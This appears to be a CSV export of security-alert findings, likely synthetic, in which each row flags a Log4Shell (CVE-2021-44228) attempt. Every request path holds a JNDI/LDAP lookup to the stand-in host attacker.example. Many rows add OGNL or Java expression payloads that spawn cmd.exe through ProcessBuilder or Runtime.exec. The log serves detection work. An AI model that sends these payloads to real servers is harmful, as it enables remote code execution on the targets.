"FINDING_ID","DETECTED_AT","FINDING_TYPE","SEVERITY","STATUS","STATUS_COMMENT","TIMESTAMP","IP_ADDRESS","REQUEST_PATH","REQUEST_METHOD","STATUS_CODE","BYTES_SENT","BACKEND_IP","DESCRIPTION","LAST_UPDATED_AT","LAST_UPDATED_BY","EMAIL_SENT","EMAIL_SENT_AT"
11,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","213.137.129.110","/login/css/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",400,3086,"192.168.9.170","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
12,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","171.119.73.165","/home/css/${jndi:ldap://attacker.example/Exploit#{${"""".getClass().forName(""java.lang.Runtime"").getDeclaredMethods()[6].invoke(null).exec(""calc.exe"")}}}.html","POST",302,7098,"192.168.198.49","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
13,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","221.88.177.194","/login/css/${jndi:ldap://attacker.example/Exploit<injection>}.html","PUT",404,154,"172.28.46.62","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
14,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","67.34.109.229","/about/images/${jndi:ldap://attacker.example/Exploit<injection>}.html","GET",503,6216,"10.90.133.93","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
15,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","114.0.220.150","/profile/docs/${jndi:ldap://attacker.example/Exploit#{${"""".getClass().forName(""java.lang.Runtime"").getDeclaredMethods()[6].invoke(null).exec(""calc.exe"")}}}.html","PUT",500,6801,"10.202.185.21","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
16,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","173.79.59.30","/contact/assets/${jndi:ldap://attacker.example/Exploit#{${"""".getClass().forName(""java.lang.Runtime"").getDeclaredMethods()[6].invoke(null).exec(""calc.exe"")}}}.html","GET",500,7845,"10.184.13.176","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
24,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","192.154.59.234","/profile/js/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#_res=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#_res.getWriter().println(""Hello from Log4j!""),#_res.getWriter().flush(),#_res.getWriter().close(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",200,6738,"172.21.209.87","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
25,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","150.189.162.138","/contact/assets/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","POST",403,5535,"10.226.108.142","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
26,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","176.196.157.148","/logout/js/${jndi:ldap://attacker.example/Exploit#{${"""".getClass().forName(""java.lang.Runtime"").getDeclaredMethods()[6].invoke(null).exec(""calc.exe"")}}}.html","PUT",401,4598,"192.168.161.139","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
27,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","156.15.112.1","/logout/assets/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","DELETE",404,8104,"172.23.145.253","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
28,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","165.254.111.248","/about/assets/${jndi:ldap://attacker.example/Exploit<injection>}.html","GET",302,2664,"192.168.42.234","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
29,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","139.129.21.23","/contact/images/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","DELETE",302,3129,"192.168.78.182","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
30,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","125.151.244.181","/contact/css/${jndi:ldap://attacker.example/Exploit}.html","DELETE",201,6374,"10.124.91.10","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
31,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","61.98.24.6","/register/css/${jndi:ldap://attacker.example/Exploit<injection>}.html","DELETE",403,9706,"192.168.15.158","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
32,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","103.74.196.224","/profile/css/${jndi:ldap://attacker.example/Exploit#{injection}}.html","POST",404,2248,"192.168.87.240","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
33,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","202.78.17.82","/register/docs/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","PUT",503,2620,"172.30.42.221","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
34,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","15.168.119.70","/contact/docs/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","GET",500,2541,"172.25.184.31","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
35,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","159.148.123.231","/logout/js/${jndi:ldap://attacker.example/Exploit#{injection}}.html","DELETE",404,8590,"10.96.108.75","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
36,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","32.165.230.145","/contact/assets/${jndi:ldap://attacker.example/Exploit#{injection}}.html","GET",200,2544,"10.193.172.99","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
37,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","148.129.4.201","/about/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#_res=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#_res.getWriter().println(""Hello from Log4j!""),#_res.getWriter().flush(),#_res.getWriter().close(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","GET",302,3247,"192.168.210.29","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
38,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","129.40.237.126","/contact/js/${jndi:ldap://attacker.example/Exploit<injection>}.html","GET",200,9891,"10.252.195.19","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
39,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","172.232.45.198","/home/images/${jndi:ldap://attacker.example/Exploit#{injection}}.html","POST",401,7262,"172.19.16.245","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
44,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","196.110.61.217","/login/assets/${jndi:ldap://attacker.example/Exploit#{injection}}.html","GET",400,2555,"10.168.52.180","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
45,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","85.242.96.184","/register/docs/${jndi:ldap://attacker.example/Exploit#{injection}}.html","PUT",204,1947,"10.111.114.118","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
46,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","211.8.151.126","/login/css/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","PUT",204,2710,"192.168.217.84","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
47,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","28.127.21.169","/login/assets/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","PUT",201,2239,"172.30.127.89","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
48,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","63.19.29.89","/contact/docs/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","POST",201,6950,"192.168.37.109","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
101,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","121.176.213.198","/login/css/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","PUT",404,5682,"172.25.35.228","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
102,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","112.245.0.176","/contact/css/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","GET",401,8324,"192.168.31.134","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
103,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","221.25.36.65","/login/images/${jndi:ldap://attacker.example/Exploit#{injection}}.html","DELETE",400,1333,"172.29.126.147","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
104,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","133.29.61.162","/logout/js/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","PUT",204,5765,"10.9.226.243","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
105,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","154.36.21.23","/home/assets/${jndi:ldap://attacker.example/Exploit}.html","PUT",302,3883,"192.168.37.250","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
106,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","132.85.128.70","/logout/docs/${jndi:ldap://attacker.example/Exploit}.html","POST",201,4759,"10.136.45.49","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
107,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","139.241.205.235","/profile/assets/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","POST",301,625,"172.25.144.165","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
108,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","219.87.200.140","/register/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",301,5581,"192.168.81.75","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
109,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","221.222.212.245","/home/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",200,8788,"172.26.45.122","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
110,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","138.219.89.170","/about/css/${jndi:ldap://attacker.example/Exploit}.html","PUT",204,4374,"192.168.186.74","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
111,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","219.27.248.128","/profile/css/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","POST",204,3984,"192.168.179.204","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
112,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","196.76.202.148","/profile/assets/${jndi:ldap://attacker.example/Exploit#{injection}}.html","GET",301,7101,"172.27.165.48","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
113,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","32.207.180.36","/dashboard/assets/${jndi:ldap://attacker.example/Exploit#{${"""".getClass().forName(""java.lang.Runtime"").getDeclaredMethods()[6].invoke(null).exec(""calc.exe"")}}}.html","POST",301,8902,"192.168.114.142","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
114,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","41.83.14.150","/about/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","DELETE",403,3634,"172.16.166.118","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
